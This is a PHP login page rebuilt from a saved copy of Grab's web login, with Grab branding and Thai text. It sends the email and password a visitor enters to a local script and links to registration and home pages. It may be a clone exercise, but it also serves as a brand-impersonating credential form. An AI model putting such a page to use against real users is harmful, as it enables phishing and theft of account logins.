<?php
session_start();
include("tool2.php");
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Grab</title>
  <meta name="description" content="weblogin at Grab.">
  <link rel="apple-touch-icon" href="https://weblogin.grab.com/apple-touch-icon.png">
  <link rel="shortcut icon" href="https://weblogin.grab.com/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" content="#00b140">

  <link rel="stylesheet" href="./login_files/pace.min.css">
  <link href="./login_files/app.fe15dc7a87ac32b99d39.css" rel="stylesheet">

</head>

<body class="  pace-done">
  <div class="pace  pace-inactive">
    <div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
      <div class="pace-progress-inner"></div>
    </div>
    <div class="pace-activity"></div>
  </div>
  <div id="root">

    <section class="floatingBox ant-layout">
      <div>
        <?php if (isset($_SESSION['error'])) : ?>

          <h3 align="center" class="ant-header" style="color: red;">
            <?php
            echo $_SESSION['error'];
            unset($_SESSION['error']);
            ?>
          </h3>

        <?php endif ?>
      </div>
      <div class="ant-card common__customCard___3CL84 ant-card-bordered">

        <div class="ant-card-body" style="box-shadow: 0 8px 16px 0 rgba(0,0,0,0.3);">
          <header class="AppBar__container___25Yqe ant-layout-header"><span>ลงชื่อเข้าใช้ด้วยบัญชี Grab</span><span></span></header>
          <div class="AuthContent__container___1kijo">
            <form action="login_db.php" method="post">
              <div class="AuthContent__innerContainer___2yvjH">
                <div class="AuthContent__brand___34GUL"><img alt="Grab" src="./login_files/brand.17cyXvs.svg"></div>
                <div class="VerifyPhone__container___jZVB5">
                  <div class="VerifyPhone__heading___1YlJV">โปรดใส่อีเมลของคุณ</div>
                  <form class="grab-ui ant-form">
                    <span class="VerifyPhone__inlineForm___2-3im">
                      <div class="ant-row grab-ui ant-form-item VerifyPhone__phoneInput___1boWe">
                        <div class="ant-col grab-ui ant-form-item-control-wrapper">

                          <div class="grab-ui ant-form-item-control has-success"><span class="grab-ui ant-form-item-children"><input placeholder="example@example" type="email" name="email" required class="grab-ui ant-input"></span></div>
                          <br>
                          <div class="grab-ui ant-form-item-control has-success"><span class="grab-ui ant-form-item-children"><input placeholder="รหัสผ่าน" type="password" name="password" required class="grab-ui ant-input"></span></div>
                        </div>
                      </div>
                    </span>
                    <div class="ant-row grab-ui ant-form-item">
                      <div class="ant-col grab-ui ant-form-item-control-wrapper">
                        <div class="grab-ui ant-form-item-control has-success"><span class="grab-ui ant-form-item-children"><label class="grab-ui ant-checkbox-wrapper grab-ui ant-checkbox-wrapper-checked"><span class="grab-ui ant-checkbox grab-ui ant-checkbox-checked"><input id="consent" type="checkbox" class="grab-ui ant-checkbox-input" data-__meta="[object Object]" data-__field="[object Object]" value=""><span class="grab-ui ant-checkbox-inner"></span></span><span><span>ฉันยอมรับ <strong><a href="https://www.grab.com/terms" rel="noopener noreferrer" target="_blank">ข้อตกลงและเงื่อนไข</a></strong></span></span></label></span></div>
                      </div>
                    </div>
                    <div class="ant-row grab-ui ant-form-item">
                      <div class="ant-col grab-ui ant-form-item-control-wrapper">
                        <div class="grab-ui ant-form-item-control"><span class="grab-ui ant-form-item-children"><button type="submit" name="login_user" class="ant-btn VerifyPhone__buttonNext___3BxtN ant-btn-primary"><span>ถัดไป</span></button></span></div>
                      </div>
                    </div>
                    <div class="ant-row grab-ui ant-form-item">
                      <div class="ant-col grab-ui ant-form-item-control-wrapper">
                        <div class="grab-ui ant-form-item-control has-success"><span class="grab-ui ant-form-item-children"><label class="grab-ui ant-checkbox-wrapper grab-ui ant-checkbox-wrapper-checked"><span class="grab-ui ant-checkbox grab-ui ant-checkbox-checked"> </span>
                              <p></p><span><strong><a href="register.php" style="color: green; text-decoration: underline solid;">สมัครสมาชิกได้ที่นี่</a>
                                  <p></p><a href="index.php" style="color: blue; text-decoration: underline solid;">กลับหน้าหลัก</a>
                                </strong></span></p>
                            </label></span></div>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </section>
  </div>
  <script src="./login_files/pace.min.js.ดาวน์โหลด"></script>
</body>

</html>